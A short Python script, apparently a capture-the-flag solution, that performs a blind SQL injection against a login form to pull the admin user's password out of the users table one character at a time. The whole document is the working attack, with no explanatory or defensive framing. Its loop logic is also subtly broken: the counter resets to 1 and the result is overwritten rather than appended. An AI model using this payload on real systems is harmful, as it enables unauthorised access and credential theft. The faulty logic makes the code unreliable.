import requests

url = input()

chars = [chr(i) for i in range(0, 128)]

changed = True
count = 1
flag = ""
while changed:
    changed = False
    for char in chars:
        json = {'username':'admin', 'password':f"admin ' OR SUBSTR((SELECT password from users where username='admin'),{count},1)= '{char}"}
        response = requests.post(url, json)
        if(response.status_code==200):
            count  = 1
            flag  = char
            changed = True

print(flag)

        